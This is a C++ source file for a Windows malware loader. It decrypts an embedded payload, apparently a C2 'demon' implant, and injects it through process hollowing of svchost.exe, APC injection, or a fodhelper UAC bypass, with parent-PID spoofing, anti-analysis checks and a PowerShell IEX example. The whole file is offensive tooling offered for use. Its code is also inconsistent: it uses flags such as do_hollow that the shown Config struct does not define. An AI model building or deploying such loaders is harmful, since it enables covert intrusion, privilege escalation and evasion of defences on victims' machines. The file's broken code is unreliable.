#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <windows.h>
#include "easCipher42.hpp"
#include "crypto_funcs.hpp"
#include "process_hollower.hpp"
#include "process_injection.hpp"
#include "bypass_analysis.hpp"
#include "uac_bypass.hpp"
#include "demon.x64.h"

enum class InjectionMode { DEFAULT, HOLLOW, APC, UAC };

struct Config {
    bool verbose = false;
    bool anti_analysis = false;
    InjectionMode mode = InjectionMode::DEFAULT;
    DWORD target_pid = 0;
    DWORD spoof_ppid = 0;
    std::string target_process = "svchost.exe";
    std::string custom_command = "";
};

void print_usage(const char* prog) {
    std::cout << "\n=== AES Loader - Injection Modes ===\n\n";
    std::cout << "Usage: " << prog << " [MODE] [OPTIONS]\n\n";
    
    std::cout << "MODE (pick one, default is spawn svchost + APC):\n";
    std::cout << "  -m hollow           Process hollowing (create new process)\n";
    std::cout << "  -m apc              APC injection into existing process (requires -p)\n";
    std::cout << "  -m uac              UAC bypass via fodhelper\n\n";
    
    std::cout << "OPTIONS:\n";
    std::cout << "  -v, --verbose       Enable verbose debug output\n";
    std::cout << "  -a, --anti          Run anti-analysis checks\n";
    std::cout << "  -f, --file PATH     Target process to hollow (default: svchost.exe)\n";
    std::cout << "  -p, --pid PID       PID for APC injection (required for -m apc)\n";
    std::cout << "  --ppid PPID         Parent PID spoofing (works with hollow/apc spawn)\n";
    std::cout << "  -c, --cmd COMMAND   Custom command for UAC mode (instead of relaunching)\n";
    std::cout << "  -h, --help          Show this help\n\n";
    
    std::cout << "EXAMPLES:\n";
    std::cout << "  " << prog << "\n";
    std::cout << "    -> Spawn svchost + APC inject (default)\n\n";
    
    std::cout << "  " << prog << " -v\n";
    std::cout << "    -> Spawn svchost + APC inject + verbose\n\n";
    
    std::cout << "  " << prog << " -m hollow -v\n";
    std::cout << "    -> Hollow svchost + verbose\n\n";
    
    std::cout << "  " << prog << " -m hollow -f notepad.exe --ppid 500 -v\n";
    std::cout << "    -> Hollow notepad with PPID spoof (parent: 500) + verbose\n\n";
    
    std::cout << "  " << prog << " -m apc -p 1464 -v\n";
    std::cout << "    -> APC inject into existing PID 1464 + verbose\n\n";
    
    std::cout << "  " << prog << " -m uac -c \"powershell.exe -c 'IEX(...)'\"\n";
    std::cout << "    -> UAC bypass + execute custom command\n\n";
}

Config parse_args(int argc, char* argv[]) {
    Config cfg;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];

        if (arg == "-v" || arg == "--verbose") {
            cfg.verbose = true;
        }
        else if (arg == "-h" || arg == "--hollow") {
            cfg.do_hollow = true;
        }
        else if (arg == "-f" || arg == "--file") {
            if (i + 1 < argc) {
                cfg.target_process = argv[++i];
            } else {
                std::cerr << "[-] -f/--file requires a path argument\n";
                print_usage(argv[0]);
                exit(1);
            }
        }
        else if (arg == "-p" || arg == "--pid") {
            if (i + 1 < argc) {
                try {
                    DWORD pid = std::stoul(argv[++i]);
                    cfg.target_pid = pid;
                    // Don't set do_apc yet - it depends on whether -h is present
                } catch (const std::invalid_argument& e) {
                    std::cerr << "[-] Invalid PID format: " << argv[i] << "\n";
                    print_usage(argv[0]);
                    exit(1);
                }
            } else {
                std::cerr << "[-] -p/--pid requires a PID argument\n";
                print_usage(argv[0]);
                exit(1);
            }
        }
        else if (arg == "--ppid") {
            if (i + 1 < argc) {
                try {
                    cfg.spoof_ppid = std::stoul(argv[++i]);
                } catch (const std::invalid_argument& e) {
                    std::cerr << "[-] Invalid PPID format: " << argv[i] << "\n";
                    print_usage(argv[0]);
                    exit(1);
                }
            } else {
                std::cerr << "[-] --ppid requires a PID argument\n";
                print_usage(argv[0]);
                exit(1);
            }
        }
        else if (arg == "-u" || arg == "--uac") {
            cfg.do_uac = true;
        }
        else if (arg == "-a" || arg == "--anti") {
            // Anti-analysis will run if verbose (optional)
        }
        else if (arg == "-help" || arg == "--help") {
            print_usage(argv[0]);
            exit(0);
        }
    }

    // Default to hollowing if nothing specified
    if (!cfg.do_hollow && !cfg.do_apc && !cfg.do_uac) {
        cfg.do_hollow = true;
    }

    // Smart flag resolution:
    // If -h and -p are both present, use -p as PPID spoofing
    // If only -p is present, use it for APC injection
    if (cfg.do_hollow && cfg.target_pid != 0) {
        // -h -p: use -p as PPID for hollowing
        cfg.spoof_ppid = cfg.target_pid;
        cfg.target_pid = 0;  // Clear target_pid so it's not used for APC
    } else if (cfg.target_pid != 0 && !cfg.do_hollow) {
        // -p alone: use for APC injection
        cfg.do_apc = true;
    }

    return cfg;
}

std::wstring ascii_to_wstring(const std::vector<uint8_t>& data) {
    std::string str;
    for (auto c : data) {
        if (c == '\0') break;
        str += (char)c;
    }

    int wide_size = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, nullptr, 0);
    std::wstring wstr(wide_size, 0);
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wstr[0], wide_size);
    return wstr;
}

int main(int argc, char* argv[]) {
    Config cfg = parse_args(argc, argv);

    if (cfg.verbose) std::cout << "\n=== AES LOADER ===\n";

    // 1. Run anti-analysis checks if verbose
    if (cfg.verbose) {
        BypassAnalysis bypass(true);
        if (!bypass.run_checks()) {
            return -1;
        }
    }

    // 2. Initialize cipher & decrypt
    easCipher42 cipher;
    if (!cipher.Init(payload_enc, payload_enc_len)) {
        std::cout << "[-] Cipher Init FAILED\n";
        return -1;
    }

    if (cfg.verbose) {
        std::cout << "[+] seed: " << bytes_to_hex(cipher.GetSeed(), 42) << "\n";
        std::cout << "[+] key: " << bytes_to_hex(cipher.GetKey(), 32) << "\n";
        std::cout << "[+] iv: " << bytes_to_hex(cipher.GetIV(), 16) << "\n\n";
    }

    // 3. Decrypt fodhelper path
    std::vector<uint8_t> fodpath;
    if (!cipher.Decrypt(fodhelper_enc, fodhelper_enc_len, fodpath)) {
        std::cout << "[-] Fodhelper decrypt FAILED\n";
        return -1;
    }

    if (cfg.verbose) {
        std::cout << "[+] Fodhelper path: ";
        for (auto c : fodpath) {
            if (c == '\0') break;
            std::cout << (char)c;
        }
        std::cout << "\n";
    }

    // 4. Decrypt payload
    std::vector<uint8_t> payload;
    if (!cipher.Decrypt(cipher.GetPayloadEncCiphertext(), cipher.GetPayloadEncCiphertextLen(), payload)) {
        std::cout << "[-] Payload decrypt FAILED\n";
        return -1;
    }

    if (cfg.verbose) {
        std::cout << "[+] Payload: " << payload.size() << " bytes\n";
        std::cout << "[+] Header: " << bytes_to_hex(payload.data(), 16) << "\n\n";
    }

    // 5. Execute injection method
    std::wstring fodpath_wide = ascii_to_wstring(fodpath);

    if (cfg.do_uac) {
        // UAC bypass mode
        std::cout << "[*] UAC bypass mode...\n";

        char loader_path[MAX_PATH];
        GetModuleFileNameA(NULL, loader_path, MAX_PATH);

        // Reconstruct args without -u flag
        std::string args;
        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];
            if (arg != "-u" && arg != "--uac") {
                args += " " + arg;
            }
        }

        UACBypass uac(loader_path, args, cfg.verbose);
        if (uac.execute_fodhelper()) {
            std::cout << "[+] UAC bypass executed - fodhelper will relaunch elevated\n";
            Sleep(2000);
            return 0;
        } else {
            std::cout << "[-] UAC bypass FAILED\n";
            return -1;
        }
    }
    else if (cfg.do_hollow) {
        // Process hollowing (has priority over APC if both specified)
        std::cout << "[*] Hollowing mode (target: " << cfg.target_process << ")...\n";
        if (cfg.spoof_ppid != 0) {
            std::cout << "[*] PPID spoofing enabled (target: " << cfg.spoof_ppid << ")...\n";
        }

        // Convert target_process to wide string
        int wide_size = MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, nullptr, 0);
        std::wstring target_wide(wide_size, 0);
        MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, &target_wide[0], wide_size);

        ProcessHollower hollower(cfg.verbose, cfg.spoof_ppid);
        if (hollower.HollowProcess(target_wide.c_str(), payload)) {
            std::cout << "[+] SUCCESS\n";
            return 0;
        } else {
            std::cout << "[-] FAILED\n";
            return -1;
        }
    }
    else if (cfg.do_apc) {
        // APC injection into existing process
        std::cout << "[*] APC injection mode (PID " << cfg.target_pid << ")...\n";

        ProcessInjection injector(cfg.verbose);
        if (injector.InjectViaAPC(cfg.target_pid, payload)) {
            std::cout << "[+] SUCCESS\n";
            return 0;
        } else {
            std::cout << "[-] FAILED\n";
            return -1;
        }
    }

    return 0;
}
